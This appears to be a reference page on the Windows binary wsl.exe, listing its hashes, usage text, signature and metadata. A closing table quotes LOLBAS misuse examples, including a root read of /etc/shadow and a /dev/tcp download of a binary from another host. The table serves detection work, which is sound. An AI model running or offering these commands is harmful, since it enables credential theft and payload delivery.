---
title: wsl.exe | Microsoft Windows Subsystem for Linux Launcher
---

# wsl.exe 

* File Path: `C:\Windows\system32\wsl.exe`
* Description: Microsoft Windows Subsystem for Linux Launcher

## Hashes

Type | Hash
-- | --
MD5 | `A27FCE08E879A6CB68B0FEA6CDE96F61`
SHA1 | `52F4E5F7BB63CA670A828479845A1C00C650FD12`
SHA256 | `ACBCB4D41833B98660908027FE0033A705E6D647FC3CA3A08B6FBB449F6664C0`
SHA384 | `D70721903FF6386D1A9947AB29344F9256CAB12772B8E362BACDB8C15C9B8C854368327888CE01BF6784FAFB59AC50CC`
SHA512 | `4EEAFBF63DA5C917A0AAC2334763898A5AD47BDEE0E770F6F7BE040320101565C0EFF00646FEF50DAC35D59FB5D4E065EA366D77D5B4E07433A14E74A84CB756`
SSDEEP | `6144:eE38JI+OhG9Aaam6Ex+hhLY72EZE3hkWG/:T38JxOhWamxoxk`

## Runtime Data

### Usage (stdout):
```cmhg
Invalid command line option: -help
Usage: wsl.exe [option] ...
Options:
    -d, --distribution <DistributionName>
        Launch the specified distribition.

    -e, --exec <CommandLine>
        Execute the specified Linux command. The remainder of the arguments are
        used as the command line to execute.

    -u, --user <UserName>
        Run as the specified user.

    --help
        Display this usage information.

    --
        Stop parsing arguments and pass the remainder to the Linux process.

```

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: wsl.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `wsl.exe` being misused. While `wsl.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `Name: Wsl.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `  - Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `    Description: Executes calc.exe from wsl.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `  - Command: wsl.exe -u root -e cat /etc/shadow` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `  - Command: wsl.exe --exec bash -c 'cat file'` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `  - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `  - Path: C:\Windows\System32\wsl.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wsl.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml) | `  - IOC: Child process from wsl.exe` | 



MIT License. Copyright (c) 2020 Strontic.


